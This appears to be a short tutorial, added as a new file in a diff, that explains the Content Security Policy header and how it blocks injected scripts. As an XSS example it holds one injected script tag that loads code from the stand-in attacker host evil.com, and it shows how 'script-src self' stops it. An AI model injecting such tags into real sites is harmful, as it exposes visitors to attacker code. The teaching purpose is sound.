@@ -1,0 +1,26 @@
+🛡️ What is Content Security Policy (CSP)?
+
+CSP is a security header sent by the server to the browser that tells:
+“Here’s what kind of content you can or can’t load on this page.”
+✅ So even if someone tries to inject a <script> tag or load a bad image, the browser 
+will block it if CSP rules don’t allow it.
+
+
+🔥 Why CSP Matters (Example)
+Say your site is vulnerable to XSS. An attacker adds:
+
+
+<script src="http://evil.com/hack.js"></script>
+With CSP like this:
+
+Content-Security-Policy: script-src 'self'
+🧱 Browser blocks the script from evil.com — because only scripts from 'self' (your own domain) are allowed.
+
+ 
+
+🛠️ How CSP Works (Basics)
+You send a CSP header from the server:
+
+Content-Security-Policy: policy-here
+It tells the browser what is allowed and what is blocked.
+
